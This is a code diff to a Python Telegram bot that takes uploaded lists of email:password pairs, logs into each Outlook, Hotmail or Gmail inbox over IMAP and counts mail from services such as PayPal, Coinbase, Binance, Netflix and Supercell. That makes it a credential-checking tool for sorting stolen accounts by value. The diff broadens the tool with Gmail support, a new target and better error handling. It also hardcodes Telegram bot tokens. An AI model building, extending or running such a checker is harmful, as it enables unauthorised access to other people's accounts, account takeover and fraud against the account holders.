@@ -7,7 +7,7 @@ from telegram import Update
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 
 # Telegram bot token
-BOT_TOKEN = '6972425077:AAG1-KTOtuR-qVO6siEP1sOnyilWbds8Sy4'
+BOT_TOKEN = '.7222570421:AAEOcp133IxVFESRaDJtXSD4eJY12e6--OY'
 
 # Configure logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -17,7 +17,7 @@ logger = logging.getLogger(__name__)
 TARGETS = [
     "instagram.com", "netflix.com", "spotify.com", "paypal.com",
     "cash.app", "adobe.com", "facebook.com", "coinbase.com",
-    "binance.com", "eezy.com", "digitalocean.com"
+    "binance.com", "eezy.com", "digitalocean.com", "supercell.com"
 ]
 
 def start(update: Update, _: CallbackContext) -> None:
@@ -27,19 +27,33 @@ def help_command(update: Update, _: CallbackContext) -> None:
     update.message.reply_text('Send me a text file with email:password pairs, and I will check the inbox for specific targets.')
 
 def check_email_inbox(email_user, email_pass, targets):
-    mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
+    if "hotmail.com" in email_user or "outlook.com" in email_user:
+        imap_server = "imap-mail.outlook.com"
+    elif "gmail.com" in email_user:
+        imap_server = "imap.gmail.com"
+    else:
+        return None
+
+    mail = imaplib.IMAP4_SSL(imap_server)
     try:
         mail.login(email_user, email_pass)
     except imaplib.IMAP4.error:
         return None
 
-    mail.select("inbox")
+    try:
+        mail.select("inbox")
+    except imaplib.IMAP4.error:
+        return None
+
     results = {}
     for target in targets:
-        status, messages = mail.search(None, f'FROM "{target}"')
-        if status == "OK":
-            results[target] = len(messages[0].split())
-        else:
+        try:
+            status, messages = mail.search(None, f'FROM "{target}"')
+            if status == "OK":
+                results[target] = len(messages[0].split())
+            else:
+                results[target] = 0
+        except:
             results[target] = 0
 
     mail.logout()
@@ -98,4 +112,3 @@ def main():
 if __name__ == '__main__':
     print("Telegram Bot by @runilundlegamera")
     main()
-    
